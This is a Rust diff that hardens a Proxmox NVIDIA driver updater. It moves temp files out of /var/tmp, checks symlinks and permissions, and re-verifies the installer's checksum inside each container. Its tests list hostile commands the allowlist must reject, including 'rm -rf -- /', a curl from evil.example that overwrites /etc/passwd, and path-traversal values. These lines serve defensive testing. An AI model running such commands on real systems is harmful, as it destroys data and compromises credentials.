@@ -24,16 +24,38 @@ use std::sync::atomic::{AtomicBool, Ordering as AtomicOrdering};
 pub const INDEX_URL: &str = "https://download.nvidia.com/XFree86/Linux-x86_64/";
 /// Lectura del índice (sin opt-in: también la usa la TUI para decidir si ofrece el modal).
 pub const INDEX_CURL: &[&str] = &["curl", "-fsS", "--proto", "=https", "--max-time", "30", INDEX_URL];
-pub const WORK_DIR: &str = "/var/tmp/pxu-nvidia";
-pub const CT_RUN_PATH: &str = "/var/tmp/pxu-nvidia.run";
+/// Bajo `/var/lib` (solo root crea ahí): `/var/tmp` es sticky y de escritura pública, y otro usuario podía precrear la carpeta o un symlink.
+pub const WORK_DIR: &str = "/var/lib/pxu-nvidia";
+/// Dentro de cada CT el instalador va a un directorio nuevo (`mktemp -d`, 0700, del root del CT) bajo `/var/lib` (no `/var/tmp`, sticky y de escritura pública).
+pub const CT_DIR_PREFIX: &str = "/var/lib/pxu-nvidia.";
+const CT_RUN_NAME: &str = "nvidia.run";
 /// Instalador que deja el `.run`: su presencia = el driver NO viene de apt.
 pub const UNINSTALL: &str = "/usr/bin/nvidia-uninstall";
 const NVRM: &str = "/proc/driver/nvidia/version";
 /// Libre mínimo en el host (descarga ~400 MB + extracción + compilación) y en cada CT (extracción del `.run`, como ProxMenux).
 pub const MIN_FREE_HOST_KB: u64 = 4 * 1024 * 1024;
 pub const MIN_FREE_CT_KB: u64 = 1500 * 1024;
-/// Tope de la instalación y de la descarga: se espera de verdad (`no_kill_on_timeout`).
+/// Tope de las dos instalaciones (host y librerías de un CT): se espera de verdad (`no_kill_on_timeout`).
 const LONG_S: u64 = 3600;
+/// Pasos que no tocan el sistema (se pueden cortar): descarga, extracción y compilación de prueba, copia al CT.
+const FETCH_S: u64 = 1800;
+/// `sha256sum` y `--check` del instalador.
+const VERIFY_S: u64 = 600;
+/// Órdenes `pct` con espera propia (parar, arrancar, copiar: 90–120 s).
+const PCT_S: u64 = 120;
+/// Cola de SIGTERM + SIGKILL de una orden que se corta.
+const CUT_S: u64 = 30;
+
+/// Peor caso del paso, sumando TODAS las órdenes que puede ejecutar (el test `worst_s_covers_every_command_it_runs` lo comprueba contra el mock):
+/// host = descarga, sha256, `--check`, extracción, compilación de prueba, instalación (esta con el margen de `no_kill_on_timeout`) y 16 consultas;
+/// cada CT con GPU = parar y arrancar (dos veces: la recuperación repite el arranque), copia, sha256, instalador (con margen), borrado, `nvidia-smi`, reinicio y 8 consultas.
+pub fn worst_s(cfg: &Config, gpu_cts: u64) -> u64 {
+    let q = cfg.check.timeout_s + CUT_S;
+    let kill = super::NO_KILL_TAIL_S;
+    let host = 3 * (FETCH_S + CUT_S) + 2 * (VERIFY_S + CUT_S) + (LONG_S + kill) + 16 * q;
+    let ct = (FETCH_S + CUT_S) + (LONG_S + kill) + 6 * (PCT_S + CUT_S) + 8 * q;
+    host + gpu_cts * ct
+}
 
 // ---------------------------------------------------------------- versiones
 
@@ -131,7 +153,7 @@ impl Grant {
     pub fn new(version: &str, kernel: &str, flavor: &str, stop_cts: Vec<u32>, libs_cts: Vec<u32>) -> Option<Grant> {
         (parse_version(version).is_some() && kernel_ok(kernel) && matches!(flavor, "open" | "proprietary")).then(|| Grant { version: version.into(), kernel: kernel.into(), flavor: flavor.into(), stop_cts, libs_cts })
     }
-    pub fn mkdir(&self) -> Argv { a(&["install", "-d", "-m", "0700", WORK_DIR]) }
+    pub fn mkdir(&self) -> Argv { a(&["install", "-d", "-m", "0700", "-o", "root", "-g", "root", WORK_DIR]) }
     pub fn df(&self) -> Argv { a(&["df", "-Pk", WORK_DIR]) }
     pub fn fetch_sha(&self) -> Argv { a(&["curl", "-fsS", "--proto", "=https", "--max-time", "30", &sha_url(&self.version)]) }
     pub fn download(&self) -> Argv { a(&["curl", "-fSL", "--proto", "=https", "--retry", "3", "--max-time", "3600", "-o", &run_path(&self.version), &run_url(&self.version)]) }
@@ -153,7 +175,9 @@ impl Grant {
     pub fn ct_stop(&self, id: u32) -> Argv { a(&["pct", "stop", &id.to_string()]) }
     pub fn ct_start(&self, id: u32) -> Argv { a(&["pct", "start", &id.to_string()]) }
     pub fn ct_reboot(&self, id: u32) -> Argv { a(&["pct", "reboot", &id.to_string()]) }
-    pub fn ct_push(&self, id: u32) -> Argv { a(&["pct", "push", &id.to_string(), &run_path(&self.version), CT_RUN_PATH]) }
+    pub fn ct_push(&self, id: u32, dir: &str) -> Argv {
+        a(&["pct", "push", &id.to_string(), &run_path(&self.version), &ct_run(dir), "--user", "0", "--group", "0", "--perms", "0700"])
+    }
 
     fn fixed(&self) -> Vec<Argv> {
         vec![
@@ -163,12 +187,20 @@ impl Grant {
     }
 }
 
-/// Dentro de un CT: libs sin módulos de kernel (el módulo vive en el host), `df`, borrar el `.run` copiado y leer la versión.
-pub const CT_DF: &[&str] = &["df", "-Pk", "/var/tmp"];
-pub const CT_RM: &[&str] = &["rm", "-f", CT_RUN_PATH];
-pub const CT_LIBS: &[&str] = &[
-    "sh", CT_RUN_PATH, "--no-kernel-modules", "--no-questions", "--ui=none", "--no-nouveau-check", "--no-dkms", "--no-install-compat32-libs", "--tmpdir=/var/tmp",
-];
+/// Dentro de un CT: `df`, directorio temporal privado, `sha256sum`/instalador/borrado sobre ese directorio y la versión.
+pub const CT_DF: &[&str] = &["df", "-Pk", "/var/lib"];
+pub const CT_MKTEMP: &[&str] = &["mktemp", "-d", "/var/lib/pxu-nvidia.XXXXXXXX"];
+
+/// `mktemp -d` devuelve exactamente `CT_DIR_PREFIX` + 8 caracteres alfanuméricos: cualquier otra cosa no se usa.
+pub fn ct_dir_ok(d: &str) -> bool {
+    d.strip_prefix(CT_DIR_PREFIX).is_some_and(|r| r.len() == 8 && r.bytes().all(|b| b.is_ascii_alphanumeric()))
+}
+fn ct_run(dir: &str) -> String { format!("{dir}/{CT_RUN_NAME}") }
+pub fn ct_sha(dir: &str) -> Argv { a(&["sha256sum", &ct_run(dir)]) }
+pub fn ct_rm(dir: &str) -> Argv { a(&["rm", "-rf", "--", dir]) }
+pub fn ct_libs_argv(dir: &str) -> Argv {
+    a(&["sh", &ct_run(dir), "--no-kernel-modules", "--no-questions", "--ui=none", "--no-nouveau-check", "--no-dkms", "--no-install-compat32-libs", &format!("--tmpdir={dir}")])
+}
 
 fn eq(argv: &[&str], b: &[String]) -> bool {
     argv.len() == b.len() && argv.iter().zip(b).all(|(x, y)| x == y)
@@ -179,12 +211,18 @@ pub fn is_host_argv(argv: &[&str], g: &Grant) -> bool {
     if g.fixed().iter().any(|f| eq(argv, f)) {
         return true;
     }
-    g.stop_cts.iter().chain(&g.libs_cts).any(|&id| [g.ct_shutdown(id), g.ct_stop(id), g.ct_start(id), g.ct_reboot(id)].iter().any(|f| eq(argv, f))) || g.libs_cts.iter().any(|&id| eq(argv, &g.ct_push(id)))
+    g.stop_cts.iter().chain(&g.libs_cts).any(|&id| [g.ct_shutdown(id), g.ct_stop(id), g.ct_start(id), g.ct_reboot(id)].iter().any(|f| eq(argv, f)))
+        || ct_dir_in(argv).is_some_and(|d| g.libs_cts.iter().any(|&id| eq(argv, &g.ct_push(id, d))))
 }
 
 /// Comandos dentro de un CT (solo los de `libs_cts`).
 pub fn is_guest_argv(argv: &[&str], vmid: u32, g: &Grant) -> bool {
-    g.libs_cts.contains(&vmid) && (argv == CT_DF || argv == CT_RM || argv == CT_LIBS || argv == hostcheck::NVIDIA_SMI)
+    g.libs_cts.contains(&vmid) && (argv == CT_DF || argv == CT_MKTEMP || argv == hostcheck::NVIDIA_SMI || ct_dir_in(argv).is_some_and(|d| [ct_sha(d), ct_rm(d), ct_libs_argv(d)].iter().any(|f| eq(argv, f))))
+}
+
+/// El directorio temporal de un CT que aparece en `argv` (en `pct push`, `sha256sum`, el instalador o `rm -rf`), solo si tiene la forma exacta.
+fn ct_dir_in<'a>(argv: &[&'a str]) -> Option<&'a str> {
+    argv.iter().find_map(|x| x.strip_suffix(&format!("/{CT_RUN_NAME}")).or_else(|| x.strip_prefix("--tmpdir=")).or(Some(x)).filter(|d| ct_dir_ok(d)))
 }
 
 // ---------------------------------------------------------------- oferta (TUI)
@@ -271,7 +309,7 @@ pub struct NvidiaRun {
 }
 
 impl NvidiaRun {
-    fn skipped(why: &str) -> NvidiaRun {
+    pub(super) fn skipped(why: &str) -> NvidiaRun {
         NvidiaRun { outcome: Outcome::Skipped, from: None, to: None, detail: why.into(), log_path: None, took_s: 0, cts: vec![] }
     }
 }
@@ -282,6 +320,7 @@ fn quick(cfg: &Config) -> ExecOpts<'static> {
     ExecOpts { timeout_s: Some(cfg.check.timeout_s), env: vec![("LC_ALL".into(), "C".into())], ..Default::default() }
 }
 
+/// Las dos instalaciones: no se matan a mitad (`no_kill_on_timeout`).
 fn long() -> ExecOpts<'static> {
     ExecOpts { timeout_s: Some(LONG_S), no_kill_on_timeout: true, env: vec![("LC_ALL".into(), "C".into())], ..Default::default() }
 }
@@ -376,9 +415,16 @@ fn body(c: &mut Cx, cfg: &Config, g: &Grant, host_needs: bool, libs: &[&crate::s
     // ---- preparación: solo toca WORK_DIR
     c.cx.step(super::Step::Preflight);
     let q = quick(cfg);
+    // `install -d` seguiría un symlink y cambiaría el modo del destino: la ruta preexistente se valida ANTES (sin seguir symlinks) y otra vez después
+    if let Err(why) = check_work_dir(c.cx.host, true) {
+        return fail(c, why);
+    }
     match c.cx.host_cmd(&argv(&g.mkdir()), &q) {
         Ok(0) => {}
         r => return fail(c, format!("cannot create {WORK_DIR}: {}", describe(&r))),
+    }
+    if let Err(why) = check_work_dir(c.cx.host, false) {
+        return fail(c, why);
     }
     match c.cx.host_cmd(&argv(&g.df()), &q) {
         Ok(0) if free_kb(&c.cx).is_some_and(|k| k >= MIN_FREE_HOST_KB) => {}
@@ -392,11 +438,11 @@ fn body(c: &mut Cx, cfg: &Config, g: &Grant, host_needs: bool, libs: &[&crate::s
     };
     let Some(want) = want else { return fail(c, "the NVIDIA .sha256sum file is malformed".into()) };
     c.cx.step(super::Step::Refresh);
-    match c.cx.host_cmd(&argv(&g.download()), &long()) {
+    match c.cx.host_cmd(&argv(&g.download()), &long_s(FETCH_S)) {
         Ok(0) => {}
         r => return fail(c, format!("download failed: {}", describe(&r))),
     }
-    let got = match c.cx.host_cmd(&argv(&g.sha256sum()), &long()) {
+    let got = match c.cx.host_cmd(&argv(&g.sha256sum()), &long_s(VERIFY_S)) {
         Ok(0) => c.cx.capture.iter().find_map(|l| l.split_whitespace().next().map(str::to_ascii_lowercase)),
         r => return fail(c, format!("sha256sum failed: {}", describe(&r))),
     };
@@ -404,7 +450,7 @@ fn body(c: &mut Cx, cfg: &Config, g: &Grant, host_needs: bool, libs: &[&crate::s
         return fail(c, format!("SHA-256 mismatch for {file}: the download does not match NVIDIA's checksum; nothing was installed"));
     }
     c.cx.say("sha256 OK");
-    match c.cx.host_cmd(&argv(&g.check()), &long()) {
+    match c.cx.host_cmd(&argv(&g.check()), &long_s(VERIFY_S)) {
         Ok(0) => c.cx.say("installer integrity (--check) OK"),
         r => return fail(c, format!("the .run integrity check failed: {}", describe(&r))),
     }
@@ -414,7 +460,7 @@ fn body(c: &mut Cx, cfg: &Config, g: &Grant, host_needs: bool, libs: &[&crate::s
             return fail(c, format!("kernel headers for the running kernel are missing (/lib/modules/{}/build): the module could not be built", g.kernel));
         }
         for (what, cmd) in [("extract", g.extract()), ("test build", g.make())] {
-            match c.cx.host_cmd(&argv(&cmd), &long()) {
+            match c.cx.host_cmd(&argv(&cmd), &long_s(FETCH_S)) {
                 Ok(0) => {}
                 r => return fail(c, format!("{what} of the driver failed ({}); the current driver was not touched", describe(&r))),
             }
@@ -431,7 +477,7 @@ fn body(c: &mut Cx, cfg: &Config, g: &Grant, host_needs: bool, libs: &[&crate::s
     // ---- librerías de los CT (el host ya está bien)
     let mut bad = 0;
     for ct in libs {
-        let r = ct_libs(c, g, ct.vmid, &ct.name, host_needs && g.stop_cts.contains(&ct.vmid));
+        let r = ct_libs(c, g, ct.vmid, &ct.name, host_needs && g.stop_cts.contains(&ct.vmid), &want);
         if r.outcome == Outcome::Failed {
             bad += 1;
         }
@@ -441,6 +487,25 @@ fn body(c: &mut Cx, cfg: &Config, g: &Grant, host_needs: bool, libs: &[&crate::s
     let what = if host_needs { format!("host driver {} → {}", c.from.as_deref().unwrap_or("?"), g.version) } else { format!("host driver already {}", g.version) };
     let detail = format!("{what}; CT libs: {n_ok}/{} updated", libs.len());
     ((if bad > 0 { Outcome::Warn } else { Outcome::Ok }, detail), None)
+}
+
+/// `WORK_DIR` debe ser un directorio real (no symlink), de root y 0700. Ausente vale solo antes de crearlo (`may_be_missing`).
+fn check_work_dir(host: &dyn Host, may_be_missing: bool) -> Result<(), String> {
+    let m = match host.file_meta(Path::new(WORK_DIR)) {
+        Ok(m) => m,
+        Err(e) if may_be_missing && e.kind() == std::io::ErrorKind::NotFound => return Ok(()),
+        Err(e) => return Err(format!("{WORK_DIR} is not usable ({e}); refusing to use it")),
+    };
+    if !m.is_dir {
+        return Err(format!("{WORK_DIR} is not a directory; refusing to use it"));
+    }
+    if m.uid != 0 {
+        return Err(format!("{WORK_DIR} is not owned by root (uid {}); refusing to use it", m.uid));
+    }
+    if m.mode != 0o700 {
+        return Err(format!("{WORK_DIR} must be mode 0700 (it is {:04o}); refusing to use it", m.mode));
+    }
+    Ok(())
 }
 
 fn describe(r: &Result<i32, String>) -> String {
@@ -514,8 +579,8 @@ fn recover(c: &mut Cx, g: &Grant, stopped: &[u32], why: String) -> Res {
     ((Outcome::Failed, detail), Some("NVIDIA driver update failed".into()))
 }
 
-/// Librerías de un CT: copia el `.run`, `--no-kernel-modules`, verifica con `nvidia-smi` y reinicia el CT.
-fn ct_libs(c: &mut Cx, g: &Grant, vmid: u32, name: &str, we_stopped_it: bool) -> NvidiaCt {
+/// Librerías de un CT: copia el `.run` a un directorio privado nuevo, revisa su SHA-256 allí, `--no-kernel-modules`, verifica con `nvidia-smi` y reinicia el CT.
+fn ct_libs(c: &mut Cx, g: &Grant, vmid: u32, name: &str, we_stopped_it: bool, want: &str) -> NvidiaCt {
     let done = |c: &mut Cx, outcome: Outcome, detail: &str| {
         c.cx.say(&format!("CT {vmid}: {detail}"));
         NvidiaCt { vmid, name: name.into(), outcome, detail: detail.into() }
@@ -534,17 +599,35 @@ fn ct_libs(c: &mut Cx, g: &Grant, vmid: u32, name: &str, we_stopped_it: bool) ->
     }
     match c.cx.guest(CT_DF, &q) {
         Ok(0) if free_kb(&c.cx).is_some_and(|k| k >= MIN_FREE_CT_KB) => {}
-        Ok(0) => return done(c, Outcome::Failed, &format!("not enough free space in the CT (/var/tmp): {} MB needed", MIN_FREE_CT_KB / 1024)),
+        Ok(0) => return done(c, Outcome::Failed, &format!("not enough free space in the CT (/var/lib): {} MB needed", MIN_FREE_CT_KB / 1024)),
         r => return done(c, Outcome::Failed, &format!("cannot check CT free space: {}", describe(&r))),
     }
-    let mut result = match c.cx.host_cmd(&argv(&g.ct_push(vmid)), &long()) {
-        Ok(0) => match c.cx.guest(CT_LIBS, &long()) {
-            Ok(0) => None,
-            r => Some(format!("the libs installer failed: {}", describe(&r))),
-        },
+    let dir = match c.cx.guest(CT_MKTEMP, &q) {
+        Ok(0) => c.cx.capture.iter().map(|l| l.trim()).find(|l| !l.is_empty()).map(String::from),
+        r => return done(c, Outcome::Failed, &format!("cannot create a private directory in the CT: {}", describe(&r))),
+    };
+    let Some(dir) = dir.filter(|d| ct_dir_ok(d)) else {
+        return done(c, Outcome::Failed, "the CT returned an unexpected temporary directory; nothing was copied");
+    };
+    let mut result = match c.cx.host_cmd(&argv(&g.ct_push(vmid, &dir)), &long_s(FETCH_S)) {
+        Ok(0) => {
+            // el directorio es de root y 0700; aun así se revisa lo copiado justo antes de ejecutarlo
+            let sha = match c.cx.guest(&argv(&ct_sha(&dir)), &q) {
+                Ok(0) => c.cx.capture.iter().find_map(|l| l.split_whitespace().next().map(str::to_ascii_lowercase)),
+                _ => None,
+            };
+            if sha.as_deref() != Some(want) {
+                Some("the installer copied into the CT does not match the verified SHA-256; not executed".to_string())
+            } else {
+                match c.cx.guest(&argv(&ct_libs_argv(&dir)), &long()) {
+                    Ok(0) => None,
+                    r => Some(format!("the libs installer failed: {}", describe(&r))),
+                }
+            }
+        }
         r => Some(format!("cannot copy the installer into the CT: {}", describe(&r))),
     };
-    let _ = c.cx.guest(CT_RM, &q);
+    let _ = c.cx.guest(&argv(&ct_rm(&dir)), &q);
     if result.is_none() {
         let v = match c.cx.guest(hostcheck::NVIDIA_SMI, &q) {
             Ok(0) => hostcheck::parse_smi_version(&c.cx.capture),
@@ -622,15 +705,26 @@ mod tests {
         for f in g.fixed() {
             assert!(is_host_argv(&argv(&f), &g), "{f:?}");
         }
-        assert!(is_host_argv(&argv(&g.ct_push(134)), &g));
-        assert!(!is_host_argv(&argv(&g.ct_push(999)), &g), "other CT");
+        let d = format!("{CT_DIR_PREFIX}Ab3dE9xZ");
+        assert!(is_host_argv(&argv(&g.ct_push(134, &d)), &g));
+        assert!(!is_host_argv(&argv(&g.ct_push(999, &d)), &g), "other CT");
+        for bad in ["/var/tmp/pxu-nvidia.run", "/var/tmp/pxu-nvidia.Ab3dE9xZ", "/var/lib/pxu-nvidia.short", "/var/lib/pxu-nvidia.Ab3dE9xZ/../x", "/var/lib/pxu-nvidia.Ab3dE9x/", "/etc"] {
+            assert!(!is_host_argv(&argv(&g.ct_push(134, bad)), &g), "{bad}");
+            assert!(!is_guest_argv(&argv(&ct_libs_argv(bad)), 134, &g), "{bad}");
+            assert!(!is_guest_argv(&argv(&ct_rm(bad)), 134, &g), "{bad}");
+            assert!(!ct_dir_ok(bad), "{bad}");
+        }
         assert!(!is_host_argv(&["pct", "stop", "999"], &g));
-        assert!(!is_host_argv(&["sh", "/var/tmp/pxu-nvidia/other.run", "--check"], &g), "other version/file");
+        assert!(!is_host_argv(&["sh", "/var/lib/pxu-nvidia/other.run", "--check"], &g), "other version/file");
         assert!(!is_host_argv(&["modprobe", "-r", "nvidia", "--force"], &g));
         assert!(!is_host_argv(&["rm", "-rf", "--", "/"], &g));
         assert!(!is_host_argv(&["rm", "-rf", "--", "/var/tmp"], &g));
         assert!(!is_host_argv(&["curl", "-o", "/etc/passwd", "https://evil.example/x.run"], &g));
-        assert!(is_guest_argv(CT_LIBS, 134, &g) && !is_guest_argv(CT_LIBS, 135, &g));
+        let libs_v = ct_libs_argv(&d);
+        let libs = argv(&libs_v);
+        assert!(is_guest_argv(&libs, 134, &g) && !is_guest_argv(&libs, 135, &g));
+        assert!(is_guest_argv(CT_MKTEMP, 134, &g) && is_guest_argv(&argv(&ct_sha(&d)), 134, &g) && is_guest_argv(&argv(&ct_rm(&d)), 134, &g));
+        assert!(!is_guest_argv(&["rm", "-rf", "--", "/var/lib"], 134, &g));
         assert!(!is_guest_argv(&["sh", "-c", "id"], 134, &g));
         assert!(Grant::new("../../x", "6.1", "open", vec![], vec![]).is_none());
         assert!(Grant::new("595.1.2", "6.1/../x", "open", vec![], vec![]).is_none());
